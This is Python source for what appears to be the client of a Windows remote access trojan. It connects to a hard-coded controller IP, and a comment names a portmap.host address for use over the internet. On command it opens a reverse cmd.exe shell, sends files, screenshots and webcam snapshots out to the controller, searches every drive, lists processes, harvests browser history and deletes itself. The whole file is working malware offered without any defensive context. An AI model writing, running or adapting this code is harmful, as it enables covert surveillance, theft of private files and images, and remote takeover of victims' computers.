import os
import socket
import subprocess
import threading
import sys
import browserhistory as bh
import time
import pyautogui
import wmi
import re
import win32api
import cv2

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))


def shell():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.43.246",12345)) # for Wan, ip = googleboy-64033.portmap.host and port = 64033

    p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    s2p_thread = threading.Thread(target=s2p, args=[s, p])
    s2p_thread.daemon = True
    s2p_thread.start()

    p2s_thread = threading.Thread(target=p2s, args=[s, p])
    p2s_thread.daemon = True
    p2s_thread.start()

def get_b_his():
    dict_obj = bh.get_browserhistory()
    print(dict_obj)
    return dict_obj

    
def get_ipinfo():
    batcmd1 = "ipconfig"
    result1 = subprocess.check_output(batcmd1, shell=True)
    result = result1.decode('utf-8')
    return result

def get_dir():
    batcmd = "dir"
    result1 = subprocess.check_output(batcmd, shell=True)
    result = result1.decode()
    return result

def upload():
    filename = sckt.recv(1024)
    filename = filename.decode()
    f = open(filename, 'rb')
    i = f.read(1024)    
    while i:
        sckt.sendall(i)
        i = f.read(1024)
    sckt.sendall(i)
    f.close()
    sckt.send(b'complete')

def download():
     filename = sckt.recv(1024)
     filename = filename.decode()
     f = open(filename, 'wb')
     data = sckt.recv(1024)
     while not (b'complete' in data):
          f.write(data)
          data = sckt.recv(1024)
     f.write(data)
     f.close()
    
def screenshot(savename):
    screenshot = pyautogui.screenshot()
    screenshot.save(savename)

def find_file(root_folder, rex):
    for root,dirs,files in os.walk(root_folder):
        for f in files:
            result = rex.search(f)
            if result:
                sckt.send(os.path.join(root, f).encode())
                #break # if you want to find only one

def find_file_in_all_drives(file_name):
    #create a regular expression for the file
    rex = re.compile(file_name)
    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
        find_file(drive, rex)

def webcam_snap(cm_indx):
    c = cv2.VideoCapture(int(cm_indx))
    ret_val, img = c.read()
    cv2.imwrite('cam.png', img)
    f = open('cam.png', 'rb')
    camdat = f.read(1024)
    while camdat:
        sckt.sendall(camdat)
        camdat = f.read(1024)
    sckt.sendall(camdat)
    f.close()
    sckt.send(b'complete')
    os.remove('cam.png')

def self_destruct():
    del_conform = sckt.recv(1024)
    del_conform = del_conform.decode()
    print('y')
    if 'y' in del_conform:
        del_msg = 'del'
        sckt.send(del_msg.encode())
        os.system('del /f client_winrat.py')
    else:
        pass

HOST = '192.168.43.246' #change to googleboy-64033.portmap.host for
PORT = 1234 # 64033 for WAN
sckt = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sckt.connect((HOST,PORT))

if __name__ == '__main__':

    while True:
        data1 = sckt.recv(1024)
        data = data1.decode()
        #print(data)

        if 'shell' in data:
            try:
                shell()
            except KeyboardInterrupt:
                pass
        elif 'ipinfo' in data:
            sckt.sendall(get_ipinfo().encode())
        elif 'download' in data:
            upload()
        elif 'upload' in data:
            download()
        elif 'screenshot' in data:
            screenshot(r'abc.png')
            f = open('abc.png', 'rb')
            #sckt.send(b'screenshot.png')
            dat = f.read(1024)
            while dat:
                sckt.sendall(dat)
                dat = f.read(1024)
            sckt.sendall(dat)
            f.close()
            sckt.send(b'complete')
            os.remove('abc.png')
        elif 'ls' in data:
            sckt.sendall(get_dir().encode())
        elif 'ps' in data or 'processes' in data:
            cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description,Id,Path'
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
            for line in proc.stdout:
                if  not line.decode()[0].isspace():
                    sckt.sendall(line.decode().rstrip().encode())
            sckt.send(b'complete')
        elif 'search' in data:
            fname = sckt.recv(1024)
            fname = fname.decode()
            find_file_in_all_drives(fname)
            sckt.send(b'complete')
        elif 'webcam_snap' in data:
            cam_index = sckt.recv(1024)
            cam_index = cam_index.decode()
            webcam_snap(cam_index)
        elif 'self destruct' in data or 'self delete' in data:
            self_destruct()
        elif 'quit' in data or 'exit' in data:
            sys.exit(1)
